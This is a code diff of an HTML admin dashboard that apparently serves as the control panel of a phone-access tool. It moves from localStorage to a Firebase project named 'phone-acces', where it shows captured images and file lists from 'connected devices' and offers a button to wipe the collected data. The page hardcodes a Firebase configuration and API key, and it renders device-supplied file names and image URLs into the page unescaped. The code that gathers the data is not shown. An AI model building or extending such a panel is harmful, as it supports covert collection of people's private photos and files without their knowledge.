@@ -3,25 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Admin - Media</title>
+    <title>Admin - Firebase Media</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif}
         body{background:#0a0a0a;color:#00ff41;min-height:100vh;padding:20px;font-family:'Courier New',monospace}
         .container{max-width:1400px;margin:0 auto}
-        .header{display:flex;justify-content:space-between;align-items:center;padding:16px 20px;background:#0d0d0d;border-radius:12px;border:1px solid #00ff4133;margin-bottom:20px}
+        .header{display:flex;justify-content:space-between;align-items:center;padding:16px 20px;background:#0d0d0d;border-radius:12px;border:1px solid #00ff4133;margin-bottom:20px;flex-wrap:wrap;gap:10px}
         .header h1{font-size:22px;color:#00ff41}
-        .header .status{display:flex;align-items:center;gap:10px;font-size:13px;color:#00ff4188}
+        .header .status{display:flex;align-items:center;gap:10px;font-size:13px;color:#00ff4188;flex-wrap:wrap}
         .header .status .dot{width:10px;height:10px;border-radius:50%;background:#00ff41;animation:pulse 2s infinite}
         @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
+        .btn{padding:8px 16px;border:none;border-radius:8px;background:#00ff4122;color:#00ff41;font-weight:600;font-size:12px;cursor:pointer;border:1px solid #00ff4133;font-family:'Courier New',monospace}
+        .btn:hover{background:#00ff4133}
+        .btn-success{background:#00ff4122;border-color:#00ff41}
+        .btn-danger{background:#ff444422;border-color:#ff4444;color:#ff4444}
         .card{background:#0d0d0d;border-radius:12px;padding:16px;margin-bottom:16px;border:1px solid #00ff4122}
-        .card h3{font-size:14px;color:#00ff41;margin-bottom:10px}
+        .card h3{font-size:14px;color:#00ff41;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px}
+        .card h3 span{color:#00ff4188;font-size:11px;font-weight:400}
         .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
         .item{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid #00ff4111;font-size:12px}
         .item .label{color:#00ff4188}
         .item .value{color:#00ff41}
-        .btn{padding:8px 16px;border:none;border-radius:8px;background:#00ff4122;color:#00ff41;font-weight:600;font-size:12px;cursor:pointer;border:1px solid #00ff4133}
-        .btn:hover{background:#00ff4133}
         .preview-img{max-width:200px;max-height:200px;border-radius:8px;border:1px solid #00ff4133;margin:8px 0}
         .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:20px}
         .stat-card{background:#0d0d0d;padding:14px 18px;border-radius:10px;border:1px solid #00ff4122}
@@ -29,7 +32,10 @@
         .stat-card .label{font-size:11px;color:#00ff4188}
         .logs{background:#000a00;padding:10px;border-radius:8px;border:1px solid #00ff4122;max-height:150px;overflow-y:auto;font-size:11px;color:#00ff4188;margin-top:10px}
         .logs .log-entry{color:#00ff41;padding:2px 0}
-        .refresh-btn{padding:4px 14px;border:none;border-radius:8px;background:#00ff4122;color:#00ff41;cursor:pointer;border:1px solid #00ff4133;font-size:11px}
+        .file-list{max-height:200px;overflow-y:auto}
+        .firebase-badge{font-size:10px;color:#00ff4188;border:1px solid #00ff4122;padding:4px 12px;border-radius:20px;display:inline-block}
+        .online{color:#00ff41}
+        .offline{color:#ff4444}
         @media(max-width:768px){.grid-2{grid-template-columns:1fr}}
     </style>
 </head>
@@ -38,12 +44,19 @@
 <div class="container">
 
     <div class="header">
-        <div><h1>📸 ADMIN - MEDIA</h1><div style="font-size:11px;color:#00ff4188;">Phone Media & Files</div></div>
+        <div>
+            <h1>📸 ADMIN - FIREBASE</h1>
+            <div style="font-size:11px;color:#00ff4188;">
+                <span class="firebase-badge">🔥 Firebase Realtime</span>
+                <span id="firebaseStatus" class="offline" style="margin-left:8px;">● Connecting...</span>
+            </div>
+        </div>
         <div class="status">
             <span class="dot"></span>
-            <span>Live</span>
+            <span id="liveStatus">Live</span>
             <span style="color:#00ff4188;margin-left:10px;font-size:11px;" id="lastUpdate">Updated: Just now</span>
-            <button class="refresh-btn" onclick="refreshData()">🔄</button>
+            <button class="btn" onclick="loadData()">🔄 Refresh</button>
+            <button class="btn btn-danger" onclick="clearFirebase()">🗑️ Clear</button>
         </div>
     </div>
 
@@ -54,112 +67,218 @@
     </div>
 
     <div id="mediaContainer">
-        <div style="color:#00ff4188;text-align:center;padding:40px;font-size:13px;">⏳ Waiting for media data...</div>
+        <div style="color:#00ff4188;text-align:center;padding:40px;font-size:13px;">⏳ Loading from Firebase...</div>
     </div>
 
     <div class="logs" id="logs">
-        <div class="log-entry">[System] Media dashboard ready</div>
+        <div class="log-entry">[System] Firebase dashboard ready</div>
     </div>
 
 </div>
 
+<!-- ===== FIREBASE SDK ===== -->
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+
 <script>
-    // ==========================================
-    // 🔥 ADMIN - MEDIA DASHBOARD
-    // ==========================================
+// ==========================================
+// 🔥 FIREBASE CONFIG - APNI CONFIG DAALO 🔥
+// ==========================================
+const firebaseConfig = {
+    apiKey: "AIzaSyCq5-Rrk6dh0SzqKcR8zR8zFHeGUgTj960",
+    authDomain: "phone-acces-f7b2a.firebaseapp.com",
+    projectId: "phone-acces-f7b2a",
+    storageBucket: "phone-acces-f7b2a.firebasestorage.app",
+    messagingSenderId: "561680712228",
+    appId: "1:561680712228:web:77bf30d6cf328e19038eb1",
+    measurementId: "G-3K3WD2EP7M"
+};
 
-    let mediaData = {};
+// Initialize Firebase
+firebase.initializeApp(firebaseConfig);
+const database = firebase.database();
 
-    function loadData() {
-        try {
-            const raw = localStorage.getItem('phone_media');
-            if (raw) {
-                mediaData = JSON.parse(raw);
+let mediaData = {};
+
+// ==========================================
+// FIREBASE STATUS
+// ==========================================
+function updateFirebaseStatus(connected) {
+    const statusEl = document.getElementById('firebaseStatus');
+    if (connected) {
+        statusEl.className = 'online';
+        statusEl.textContent = '🟢 Connected';
+        addLog('🔥 Firebase connected');
+    } else {
+        statusEl.className = 'offline';
+        statusEl.textContent = '🔴 Disconnected';
+        addLog('❌ Firebase disconnected');
+    }
+}
+
+database.ref('.info/connected').on('value', (snap) => {
+    updateFirebaseStatus(snap.val());
+});
+
+// ==========================================
+// LOAD DATA FROM FIREBASE
+// ==========================================
+function loadData() {
+    addLog('📊 Loading data from Firebase...');
+    
+    database.ref('media').once('value')
+        .then(snapshot => {
+            const data = snapshot.val();
+            if (data) {
+                mediaData = data;
                 renderMedia();
                 updateStats();
-                addLog('📊 Media data loaded: ' + Object.keys(mediaData).length + ' devices');
+                addLog('✅ Loaded: ' + Object.keys(mediaData).length + ' devices');
+                document.getElementById('lastUpdate').textContent = 'Updated: ' + new Date().toLocaleTimeString();
             } else {
-                addLog('⏳ Waiting for media data...');
+                mediaData = {};
+                document.getElementById('mediaContainer').innerHTML = '<div style="color:#00ff4188;text-align:center;padding:40px;font-size:13px;">⏳ No data in Firebase. Connect a device.</div>';
+                addLog('⚠️ No data found');
             }
-        } catch(e) { console.log('Load error:', e); }
+        })
+        .catch(err => {
+            addLog('❌ Firebase error: ' + err.message);
+        });
+}
+
+// ==========================================
+// CLEAR FIREBASE
+// ==========================================
+function clearFirebase() {
+    if (!confirm('Delete all Firebase data?')) return;
+    database.ref('media').remove()
+        .then(() => {
+            mediaData = {};
+            renderMedia();
+            updateStats();
+            addLog('🗑️ Firebase data cleared');
+            toast('🗑️ Data cleared!');
+        })
+        .catch(err => addLog('❌ Clear error: ' + err.message));
+}
+
+// ==========================================
+// RENDER MEDIA
+// ==========================================
+function renderMedia() {
+    const container = document.getElementById('mediaContainer');
+    const deviceIds = Object.keys(mediaData);
+
+    if (deviceIds.length === 0) {
+        container.innerHTML = '<div style="color:#00ff4188;text-align:center;padding:40px;font-size:13px;">⏳ No devices connected</div>';
+        return;
     }
 
-    function renderMedia() {
-        const container = document.getElementById('mediaContainer');
-        const deviceIds = Object.keys(mediaData);
+    let html = '';
+    deviceIds.forEach(id => {
+        const d = mediaData[id];
+        const lastUpdate = d.timestamp ? new Date(d.timestamp).toLocaleTimeString() : 'Never';
+        const isOnline = d.timestamp && (Date.now() - new Date(d.timestamp).getTime() < 60000);
 
-        if (deviceIds.length === 0) {
-            container.innerHTML = '<div style="color:#00ff4188;text-align:center;padding:40px;font-size:13px;">⏳ No media data yet</div>';
-            return;
-        }
-
-        let html = '';
-        deviceIds.forEach(id => {
-            const d = mediaData[id];
-            const lastUpdate = d.lastUpdate ? new Date(d.lastUpdate).toLocaleTimeString() : 'Never';
-            const isOnline = d.lastUpdate && (Date.now() - new Date(d.lastUpdate).getTime() < 60000);
-
-            html += `
-                <div class="card">
-                    <h3>📱 ${id} <span style="font-size:11px;color:#00ff4188;">${isOnline ? '🟢 Online' : '🔴 Offline'} • ${lastUpdate}</span></h3>
-                    ${d.image ? `<div><img src="${d.image}" class="preview-img"></div>` : ''}
-                    ${d.files && d.files.length > 0 ? `
-                        <div style="margin-top:8px;">
-                            <div style="font-size:12px;color:#00ff4188;">📁 ${d.files.length} files</div>
-                            ${d.files.slice(0, 5).map(f => `
+        html += `
+            <div class="card">
+                <h3>📱 ${id} <span style="font-size:11px;color:${isOnline ? '#00ff41' : '#ff4444'};">${isOnline ? '🟢 Online' : '🔴 Offline'} • ${lastUpdate}</span></h3>
+                ${d.image ? `<div><img src="${d.image}" class="preview-img"></div>` : ''}
+                ${d.files && d.files.length > 0 ? `
+                    <div style="margin-top:8px;">
+                        <div style="font-size:12px;color:#00ff4188;">📁 ${d.files.length} files</div>
+                        <div class="file-list">
+                            ${d.files.slice(0, 10).map(f => `
                                 <div class="item"><span class="label">${f.name}</span><span class="value">${Math.round(f.size/1024)} KB</span></div>
                             `).join('')}
-                            ${d.files.length > 5 ? `<div style="color:#00ff4188;font-size:11px;">+ ${d.files.length - 5} more files</div>` : ''}
+                            ${d.files.length > 10 ? `<div style="color:#00ff4188;font-size:11px;">+ ${d.files.length - 10} more</div>` : ''}
                         </div>
-                    ` : ''}
-                    <div style="font-size:11px;color:#00ff4188;margin-top:6px;">📤 Sent: ${d.timestamp ? new Date(d.timestamp).toLocaleString() : 'N/A'}</div>
-                </div>
-            `;
-        });
+                    </div>
+                ` : ''}
+                <div style="font-size:11px;color:#00ff4188;margin-top:6px;">📱 ${d.platform || 'Unknown'}</div>
+            </div>
+        `;
+    });
 
-        container.innerHTML = html;
-        document.getElementById('totalDevices').textContent = deviceIds.length;
-    }
+    container.innerHTML = html;
+    document.getElementById('totalDevices').textContent = deviceIds.length;
+}
 
-    function updateStats() {
-        const deviceIds = Object.keys(mediaData);
-        let totalImages = 0, totalFiles = 0;
-        deviceIds.forEach(id => {
-            const d = mediaData[id];
-            if (d.image) totalImages++;
-            if (d.files) totalFiles += d.files.length;
-        });
-        document.getElementById('totalImages').textContent = totalImages;
-        document.getElementById('totalFiles').textContent = totalFiles;
-    }
+// ==========================================
+// UPDATE STATS
+// ==========================================
+function updateStats() {
+    const deviceIds = Object.keys(mediaData);
+    let totalImages = 0, totalFiles = 0;
+    deviceIds.forEach(id => {
+        const d = mediaData[id];
+        if (d.image) totalImages++;
+        if (d.files) totalFiles += d.files.length;
+    });
+    document.getElementById('totalImages').textContent = totalImages;
+    document.getElementById('totalFiles').textContent = totalFiles;
+}
 
-    function refreshData() {
-        loadData();
-        document.getElementById('lastUpdate').textContent = 'Updated: ' + new Date().toLocaleTimeString();
-        addLog('🔄 Dashboard refreshed');
-    }
+// ==========================================
+// REAL-TIME LISTENER
+// ==========================================
+function startRealtimeListener() {
+    database.ref('media').on('value', snapshot => {
+        const data = snapshot.val();
+        if (data) {
+            mediaData = data;
+            renderMedia();
+            updateStats();
+            document.getElementById('lastUpdate').textContent = 'Updated: ' + new Date().toLocaleTimeString();
+            addLog('🔄 Real-time update: ' + Object.keys(mediaData).length + ' devices');
+        }
+    });
+}
 
-    function addLog(msg) {
-        const logs = document.getElementById('logs');
-        const time = new Date().toLocaleTimeString();
-        const entry = document.createElement('div');
-        entry.className = 'log-entry';
-        entry.textContent = `[${time}] ${msg}`;
-        logs.appendChild(entry);
-        logs.scrollTop = logs.scrollHeight;
-        if (logs.children.length > 20) logs.removeChild(logs.children[0]);
-    }
+// ==========================================
+// LOGS
+// ==========================================
+function addLog(msg) {
+    const logs = document.getElementById('logs');
+    const time = new Date().toLocaleTimeString();
+    const entry = document.createElement('div');
+    entry.className = 'log-entry';
+    entry.textContent = `[${time}] ${msg}`;
+    logs.appendChild(entry);
+    logs.scrollTop = logs.scrollHeight;
+    if (logs.children.length > 20) logs.removeChild(logs.children[0]);
+}
 
-    setInterval(() => { loadData(); document.getElementById('lastUpdate').textContent = 'Updated: ' + new Date().toLocaleTimeString(); }, 5000);
+// ==========================================
+// TOAST
+// ==========================================
+function toast(msg) {
+    const t = document.createElement('div');
+    t.style.cssText = `
+        position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
+        background: #001a00; color: #00ff41; padding: 10px 20px; border-radius: 8px;
+        font-size: 12px; z-index: 9999; border: 1px solid #00ff4133;
+        font-family: 'Courier New', monospace;
+    `;
+    t.textContent = msg;
+    document.body.appendChild(t);
+    setTimeout(() => { t.style.opacity = '0'; t.style.transition = 'opacity 0.3s'; setTimeout(() => t.remove(), 300); }, 2000);
+}
 
-    function init() {
-        loadData();
-        addLog('🟢 Media dashboard ready');
-        console.log('📸 Admin - Media Loaded');
-    }
+// ==========================================
+// EXPOSE FUNCTIONS
+// ==========================================
+window.loadData = loadData;
+window.clearFirebase = clearFirebase;
 
-    window.refreshData = refreshData;
-    init();
+// ==========================================
+// INIT
+// ==========================================
+loadData();
+startRealtimeListener();
+addLog('🟢 Firebase dashboard ready');
+console.log('📸 Admin - Firebase Loaded');
+console.log('🔥 Firebase DB:', firebaseConfig.databaseURL);
 </script>
 </body>
 </html>
